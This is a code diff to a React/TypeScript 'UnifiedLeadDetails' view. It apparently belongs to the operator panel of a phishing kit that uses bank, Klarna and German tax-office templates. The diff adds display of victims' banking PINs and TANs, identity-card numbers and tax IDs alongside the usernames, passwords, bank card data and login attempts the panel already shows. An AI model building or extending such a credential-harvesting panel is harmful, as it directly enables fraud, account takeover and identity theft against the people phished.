@@ -30,6 +30,8 @@ interface UnifiedLead {
   phone: string | null;
   username: string | null;
   password: string | null;
+  pin: string | null;
+  tan: string | null;
   additional_data: string;
   ip_address: string | null;
   user_agent: string | null;
@@ -129,13 +131,27 @@ export const UnifiedLeadDetails: React.FC = () => {
   const bankCard = additionalData.bank_card || {};
   const loginData = additionalData.login_data || {};
   const qrFiles = additionalData.qr_data?.files || additionalData.qr_files || [];
+  const bzstAusweisnummer = additionalData.ausweisnummer as string | undefined;
+  const bzstSteuerId = additionalData.steueridentifikationsnummer as string | undefined;
   const branchData = additionalData.selected_branch || additionalData.selectedBranch || additionalData.branchData || null;
   const selectedBank = additionalData.selected_bank || loginData.bank_type || null;
 
   // Create display name
+  const formatEmailDisplayName = (email: string): string => {
+    const localPart = email.split('@')[0] || email;
+    return localPart
+      .replace(/[._-]+/g, ' ')
+      .split(' ')
+      .filter(Boolean)
+      .map(part => part.charAt(0).toUpperCase() + part.slice(1))
+      .join(' ')
+      .trim() || email;
+  };
+
   const displayName = lead.name || 
     (personalData ? `${personalData.first_name || ''} ${personalData.last_name || ''}`.trim() : '') ||
-    lead.username || 
+    lead.username ||
+    (lead.email ? formatEmailDisplayName(lead.email) : '') ||
     'Unbekannt';
 
   // Get bank display name
@@ -181,7 +197,6 @@ export const UnifiedLeadDetails: React.FC = () => {
       <LeadHeader 
         lead={lead}
         displayName={displayName}
-        templateName={getTemplateDisplayName(lead.template_name)}
       />
 
       <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
@@ -194,12 +209,36 @@ export const UnifiedLeadDetails: React.FC = () => {
 
         {/* Authentication Data */}
         <AuthData 
-          loginData={loginData}
           username={lead.username}
           password={lead.password}
+          pin={lead.pin}
+          tan={lead.tan}
           loginAttempts={additionalData.login_attempts}
         />
       </div>
+
+      {(bzstAusweisnummer || bzstSteuerId) && (
+        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+          {bzstAusweisnummer && (
+            <div className="bg-white p-6 rounded-lg shadow-sm border border-gray-200">
+              <h3 className="text-lg font-semibold mb-4 text-gray-800 flex items-center">
+                <FileText className="mr-2 h-5 w-5 text-slate-600" />
+                Ausweisnummer
+              </h3>
+              <p className="text-gray-900 font-mono">{bzstAusweisnummer}</p>
+            </div>
+          )}
+          {bzstSteuerId && (
+            <div className="bg-white p-6 rounded-lg shadow-sm border border-gray-200">
+              <h3 className="text-lg font-semibold mb-4 text-gray-800 flex items-center">
+                <FileText className="mr-2 h-5 w-5 text-slate-600" />
+                Steueridentifikationsnummer
+              </h3>
+              <p className="text-gray-900 font-mono">{bzstSteuerId}</p>
+            </div>
+          )}
+        </div>
+      )}
 
       {/* Bank Information (for Klarna template) */}
       {selectedBank && lead.template_name === 'klarna' && (
@@ -374,7 +413,6 @@ export const UnifiedLeadDetails: React.FC = () => {
       {/* System Information */}
       <SystemInfo 
         lead={lead}
-        additionalData={additionalData}
       />
 
       {/* Notes */}
